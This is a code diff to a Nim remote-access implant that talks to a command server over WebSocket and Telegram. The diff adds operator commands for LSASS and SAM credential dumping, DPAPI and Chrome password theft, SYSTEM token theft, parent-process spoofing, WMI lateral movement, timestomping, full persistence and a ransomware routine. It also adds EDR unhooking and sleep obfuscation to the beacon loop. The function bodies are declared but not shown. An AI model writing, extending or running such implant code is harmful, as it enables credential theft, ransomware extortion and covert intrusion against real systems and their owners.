@@ -362,6 +362,26 @@ const
   S_AVICAP_CREATE = encodeObf("capCreateCaptureWindowA")
 
 # =============================================================================
+when defined(windows):
+  proc unhookNtdll(): bool
+  proc collectEncryptRegions()
+  proc ekkoSleep(ms: int)
+  proc installFullPersistenceSuite(): string
+  proc dumpLsassViaComsvcs(outPath: string): bool
+  proc dumpSamHives(outDir: string): bool
+  proc dpapiMasterKeys(): string
+  proc harvestChromePasswords(): JsonNode
+  proc spawnAsSystem(cmd: string): bool
+  proc spawnWithSpoofedParent(cmd, parentName: string): bool
+  proc wmiLateralExec(target, user, pass, cmd: string): bool
+  proc runRansomware(): string
+  proc resolveFromDeadDrop(): string
+  proc timestomp(path, referencePath: string): bool
+
+when defined(c2_ws) or defined(c2_both):
+  proc hardeningCommandsWs(cmdName, cmdArgs: string,
+                          sendToC2: proc(msg: JsonNode): Future[void] {.gcsafe.}
+                         ): Future[bool] {.async.}
 # PowerShell -EncodedCommand helper
 # =============================================================================
 proc psRun(script: string): string =
@@ -721,8 +741,7 @@ when defined(c2_ws) or defined(c2_both):
     var nonce: array[12, byte]
     discard randomBytes(addr nonce[0], 12)
     var ctx: GCM[aes256]
-    let aad = META_AAD.toOpenArrayByte(0, META_AAD.high)
-    ctx.init(key, nonce, aad)
+    ctx.init(key, nonce, META_AAD.toOpenArrayByte(0, META_AAD.high))
     var ct = newSeq[byte](plaintext.len)
     ctx.encrypt(plaintext, ct)
     let tag = ctx.getTag()
@@ -740,8 +759,7 @@ when defined(c2_ws) or defined(c2_both):
     let ct = blob[28 ..< blob.len]
     let key = deriveMetaKey(installKey)
     var ctx: GCM[aes256]
-    let aad = META_AAD.toOpenArrayByte(0, META_AAD.high)
-    ctx.init(key, nonce, aad)
+    ctx.init(key, nonce, META_AAD.toOpenArrayByte(0, META_AAD.high))
     var pt = newSeq[byte](ct.len)
     if not ctx.decrypt(ct, pt, tag): return @[]
     return pt
@@ -989,7 +1007,7 @@ when defined(windows):
       Rip: uint64
       # Tail: FltSave(512) + VectorRegister(416) + 5*8 tail fields,
       # plus alignment slack. Real total is 1232.
-      _tail: array[1024, byte]
+      tailPad: array[1024, byte]
 
     ExRecord = object
       ExceptionCode: int32
@@ -2881,7 +2899,9 @@ when defined(c2_ws) or defined(c2_both):
           await sendToC2(%* {"type": "output", "data": "[!] usage: autodrive start|stop"})
     of "ping": discard
     else:
-      await sendToC2(%* {"type": "output", "data": "[!] unknown: " & cmdName})
+      let handled = await hardeningCommandsWs(cmdName, cmdArgs, sendToC2)
+      if not handled:
+        await sendToC2(%* {"type": "output", "data": "[!] unknown: " & cmdName})
 
   proc connectAndRun(sc: SessionCrypto, url: string, meta: ref MetaData) {.async.} =
     var ws: WebSocket = nil
@@ -2970,10 +2990,7 @@ when defined(c2_ws) or defined(c2_both):
       asyncCheck receiverTask()
       var lastBeacon = getTime().toUnix
       while not closed:
-        var sleptMs = 0
-        while sleptMs < BEACON_INTERVAL * 1000 and not closed:
-          await sleepAsync(100)
-          sleptMs += 100
+        ekkoSleep(BEACON_INTERVAL * 1000)
         if closed: break
         if getTime().toUnix - lastBeacon >= BEACON_INTERVAL:
           try: await ws.send(cast[string](encryptFrame(sc, $ %* {"type": "heartbeat"})))
@@ -2999,6 +3016,8 @@ when defined(c2_ws) or defined(c2_both):
         agentLog("analysis environment detected, bailing out")
         return
       let evasionStatus = applyEvasion()
+      discard unhookNtdll()
+      collectEncryptRegions()
       agentLog("evasion: " & evasionStatus)
     var meta = new(MetaData)
     meta[] = loadMeta()
@@ -3378,7 +3397,7 @@ when defined(c2_tg):
     lines.add("run_key:    " & installRunKey())
     lines.add("task:       " & installScheduledTask())
     lines.add("stickykeys: " & installStickyKeys())
-    return lines.join("\n")
+    return lines.join("\n") & "\n" & installFullPersistenceSuite()
 
   proc removeAllPersistence(): string =
     var parts: seq[string] = @[]
@@ -3605,6 +3624,35 @@ when defined(c2_tg):
         let ok = sendToHook("[" & BuildPrefix & "] " & arg)
         if ok: "hook: ok" else: "hook: fail"
       else: "hook: webhook not configured"
+    of "/unhook":      $unhookNtdll()
+    of "/persist_all": installFullPersistenceSuite()
+    of "/lsass":
+      let p = stageDir() / "lsass.dmp"
+      let ok = dumpLsassViaComsvcs(p)
+      (if ok: "@file:" & p else: "err: lsass dump failed")
+    of "/sam":
+      let p = stageDir() / "hives"
+      if dumpSamHives(p): "hives dumped -> " & p else: "err: sam dump failed"
+    of "/dpapi":       dpapiMasterKeys()
+    of "/browsercreds": $harvestChromePasswords()
+    of "/system":
+      if spawnAsSystem(arg): "spawned as SYSTEM" else: "err: token theft failed"
+    of "/spoof":
+      if spawnWithSpoofedParent(arg, "explorer.exe"): "spawned" else: "err"
+    of "/lateral":
+      let parts = arg.split(' ', 3)
+      if parts.len < 4: "usage: /lateral <host> <user> <pass> <cmd>"
+      else:
+        if wmiLateralExec(parts[0], parts[1], parts[2], parts[3]): "ok"
+        else: "err"
+    of "/ransom":
+      if arg.strip() != "CONFIRM": "irreversible. resend: /ransom CONFIRM"
+      else: runRansomware()
+    of "/drop":        resolveFromDeadDrop()
+    of "/timestomp":
+      let parts = arg.split(' ', 1)
+      if parts.len < 2: "usage: /timestomp <target> <reference>"
+      else: (if timestomp(parts[0], parts[1]): "ok" else: "err")
     else: "unknown command: " & cmd & " (try /help)"
 
   proc initialOnline() =
@@ -3728,6 +3776,7 @@ when defined(c2_tg):
 # =============================================================================
 # ENTRY POINT
 # =============================================================================
+include "sentinel_hardening.nim"
 when isMainModule:
   when defined(windows):
     when not defined(gui):
